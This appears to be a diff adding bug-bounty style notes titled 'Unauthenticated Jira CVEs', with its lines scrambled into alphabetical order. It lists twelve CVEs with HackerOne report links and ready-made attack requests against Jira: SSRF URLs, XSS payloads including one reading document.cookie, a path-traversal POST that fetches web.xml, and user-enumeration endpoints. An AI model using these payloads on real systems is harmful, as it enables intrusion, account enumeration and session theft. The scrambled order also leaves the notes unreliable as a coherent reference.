@@ -1,0 +1,61 @@
+10. CVE-2019-11581 (Template Injection)
+11.   CVE-2019-3396 (Path Traversal)
+12.   CVE-2019-3402 (XSS)
+1. CVE-2017-9506 (SSRF)
+2. CVE-2018-20824 (XSS)
+3. CVE-2019-8451 (SSRF)
+4. CVE-2019-8449 (User Information Disclosure)
+5. CVE-2019-8442 (Sensitive Information Disclosure)
+6. CVE-2019-3403 (User Enumeration)
+7. CVE-2020-14181 (User Enumeration)
+8. CVE-2020-14178 (Project Key Enumeration)
+9. CVE-2020-14179 (Information Disclosure)
+Accept: */*
+Accept-Language: en-US,en;q=0.5 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+ConfigurePortalPages.jspa
+Connection: close
+{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}
+Content-Length: 168
+Host: {{Hostname}}
+https://hackerone.com/reports/1103582
+https://hackerone.com/reports/197726
+https://hackerone.com/reports/380354
+https://hackerone.com/reports/632808
+https://hackerone.com/reports/713900
+https://<JIRA_URL>/browse.<PROJECT_KEY>
+https://<JIRA_URL>/plugins/servlet/gadgets/makeRequest?url=https://<HOST_NAME>:1337@example.com
+https://<JIRA_URL>/plugins/servlet/oauth/users/icon-uri?consumerUri=<SSRF_PAYLOAD>
+https://<JIRA_URL>/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
+https://<JIRA_URL>/rest/api/2/user/picker?query=<USERNAME_HERE>
+https://<JIRA_URL>/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
+https://<JIRA_URL>/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
+https://<JIRA_URL>/secure/QueryComponent!Default.jspa
+https://<JIRA_URL>/secure/ViewUserHover.jspa?username=<USERNAME>
+https://<JIRA_URL>/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+/issues/?jql=
+<JIRA_URL>/secure/ContactAdministrators!default.jspa
+/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm
+/plugins/servlet/gadgets/makeRequest?url=https://victomhost:1337@example.com
+/plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com
+/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.nl
+/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
+/plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true
+POST /rest/tinymce/1/macro/preview HTTP/1.1
+Referer: {{Hostname}}
+REPORTS:- 
+/rest/api/2/dashboard?maxResults=100
+/rest/api/2/user/picker?query=admin
+/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
+/s/
+/secure/ConfigurePortalPages!default.jspa?view=popular
+/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search
+/secure/ContactAdministrators!default.jspa
+/secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false
+/secure/QueryComponent!Default.jspa
+/secure/ViewUserHover.jspa
+/servicedesk/customer/user/login
+/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+*Try above request with the Jira target
+* Try the SSTI Payloads
+# Unauthenticated Jira CVEs
+/ViewUserHover.jspa?username=Admin
